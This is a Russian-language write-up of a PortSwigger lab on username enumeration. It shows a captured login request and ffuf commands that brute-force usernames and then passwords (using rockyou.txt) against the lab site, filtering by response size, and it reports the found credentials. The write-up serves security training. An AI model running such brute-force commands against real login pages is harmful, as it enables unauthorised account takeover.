---
title: "Username enumeration via different responses"
date: 2025-09-04
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/authentication-apprentice/authentication/password-based/lab-username-enumeration-via-different-responses"
classes: wide
---

Для прохождения данной лабы нужно найти валидный логин и получить к нему доступ через ошибку в логике **аутентификации**. 

```
https://0aaa001303539ba987ef0d14004c003e.web-security-academy.net/
```

## Solution

В данном примере при вводе неправильного логина выводится сообщение об ошибке.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_different_responses/1.png){: height="200" .align-center}

При входе в аккаунт на сервер отправляется следующий `POST`-запрос:

```http
POST /login HTTP/2
Host: 0aaa001303539ba987ef0d14004c003e.web-security-academy.net/login
Cookie: session=A2mZdRv71ZtY7jlsemzgtHkRmx8tiDQo
Content-Length: 35
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="99", "Chromium";v="124"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a03003203ac78008601588400b10000.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a03003203ac78008601588400b10000.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

username=USERFUZZ&password=PASSFUZZ
```

Можно попробовать перебрать username с помощью следующей команды.

```bash
ffuf -w wordlists/portswigger_logins -u https://0aaa001303539ba987ef0d14004c003e.web-security-academy.net/login
-X POST -d "username=FUZZ&password=1"
```

В выводе видно, что размер страницы вместе с неправильным логином равен `3140`. Для удобства мы можем отфильтровать такие запросы с помощью флага `-fs 3140`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_different_responses/2.png){: height="200" .align-center}

```bash
ad                      [Status: 200, Size: 3142, Words: 1307, Lines: 64, Duration: 114ms]
:: Progress: [101/101] :: Job [1/1] :: 49 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

В ответах можно увидеть, что для логина `ad` длина ответа отличается от остальных. Попробую ввести его.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_different_responses/1.png){: height="200" .align-center}

Теперь можно попробовать перебрать пароль таким же образом, отфильтровав ответы вместе с сообщением о неправильном пароле.

```bash
ffuf -w wordlists/rockyou.txt -u https://0aaa001303539ba987ef0d14004c003e.web-security-academy.net/login -X POST -d "username=ad&password=FUZZ" -fs 3142
```

```bash
7777777                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 86ms]
```

Таким образом мы получили креды для аккаунта `ad:7777777`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_different_responses/1.png){: height="200" .align-center}